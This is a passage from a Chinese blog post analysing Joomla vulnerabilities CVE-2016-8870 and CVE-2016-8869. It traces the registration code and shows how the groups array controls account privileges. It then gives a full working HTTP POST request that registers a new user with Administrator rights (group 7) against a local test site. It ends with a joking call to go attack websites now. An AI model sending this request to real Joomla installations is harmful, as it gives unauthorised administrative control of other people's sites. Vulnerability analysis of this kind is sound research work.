再把post请求参数中的名为<code style="max-width:100%;height:auto;">task</code>的参数由<code style="max-width:100%;height:auto;">registration.register</code>换为<code style="max-width:100%;height:auto;">user.register</code>
然后发送，截图如下，注册成功。</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224148716" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">以上是<code style="max-width:100%;height:auto;">CVE-2016-8870</code>漏洞的内容，只是创建一个普通用户。
接下来就是真正<code style="max-width:100%;height:auto;">CVE-2016-8869</code>的内容。
主要目的：提权!!!</p>
<h2 id="22cve20168869">2.2 利用<code style="max-width:100%;height:auto;">CVE-2016-8869</code>进行提权操作</h2>
<p style="max-width:100%;height:auto;">首先我们再看上一小节利用<code style="max-width:100%;height:auto;">CVE-2016-8870</code>注册的时候，我们使用的<code style="max-width:100%;height:auto;">user.php</code>下<code style="max-width:100%;height:auto;">UsersControllerUser</code>累的<code style="max-width:100%;height:auto;">register</code>方法的最后面有这样一句代码</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">$return = $model-&gt;register($data);
</code></pre>
<p style="max-width:100%;height:auto;">这句代码调用了<code style="max-width:100%;height:auto;">components/com_users/models/registration.php</code>下的<code style="max-width:100%;height:auto;">register</code>方法，我们来看看这个方法
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224320232" style="max-width:100%;height:auto;"/><br/>
这里只截取了一小部分，然后这里我们把<code style="max-width:100%;height:auto;">$data</code>打印如下：</p>
<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224302744" style="max-width:100%;height:auto;"/><br/>
由下图可以看到其实我们这个<code style="max-width:100%;height:auto;">$data</code>实际还存在一个参数是<code style="max-width:100%;height:auto;">groups</code>数组，而这个数组就决定了账户的权限。
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161027204404040" style="max-width:100%;height:auto;"/><br/>
这里<code style="max-width:100%;height:auto;">groups</code>的第一个值决定了账户的权限，权限列表如下。</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">1：Public
2：Registered
3：Author
4：Editor
5：Publisher
6：Manager
7：Administrator
</code></pre>
<p style="max-width:100%;height:auto;">默认情况下我们注册时<code style="max-width:100%;height:auto;">groups</code>的第一个值为2，即<code style="max-width:100%;height:auto;">Registered</code>，这里我们直接构造如下：</p>
<p style="max-width:100%;height:auto;">我们构造如下数据包</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">POST /joomla/index.php/component/users/?task=registration.register HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8000/joomla/index.php/component/users/?view=registration
Cookie: Hm_lvt_6b15558d6e6f640af728f65c4a5bf687=1476171578,1476175753; bdshare_firstime=1476879802433; ck_login_id_20=1; ck_login_language_20=en_us; ck_login_theme_20=Sugar5; sYQDUGqqzHsearch_history=asdf%7C2%2Casdf%7C52%2Casdf%7C3%2Casdf%7C1; eeeaf53e25e90a39ff315452d513d988=rn180tb8srhihcgnqpo4avgtt6; 9d4bb4a09f511681369671a08beff228=gonv4bis6b1cu1f0c7mpbr2kt7; 72ade33b26d1725575072c551da17dac=56dhrsu2p3rdefnjfktdhp8dr7; 5fdbb0240381dcfb784bf866abf180ba=vna9ecejm5rof04o1a7umbmo23
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12126918671528593691690879232
Content-Length: 1350

-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[name]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[username]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[password1]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[password2]"

Bendawang
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[email1]"

bendawang12138@163.com
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[email2]"

bendawang12138@163.com
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="user[groups][]"

7
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="option"

com_users
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="task"

user.register
-----------------------------12126918671528593691690879232
Content-Disposition: form-data; name="ad46184799be6e742bc96a739ac62ffa"

1
-----------------------------12126918671528593691690879232--
</code></pre>
<p style="max-width:100%;height:auto;">直接构造<code style="max-width:100%;height:auto;">Administrator</code>发包，后台观查成功注册：
<br/><img alt="这里写图片描述" data-action="zoom" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/20161026224354729" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">复现完了，趁现在赶紧日一波站啊。。。</p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            Copyright©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
<a href="http://blog.csdn.net/qq_19876131"><img src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          Copyright©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/prism.js"></script>
<script src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/zooming.js"></script>
<script src="./joomla未授权创建特权用户分析（CVE-2016-8870和CVE-2016-8869)/Bendawang.js"></script>


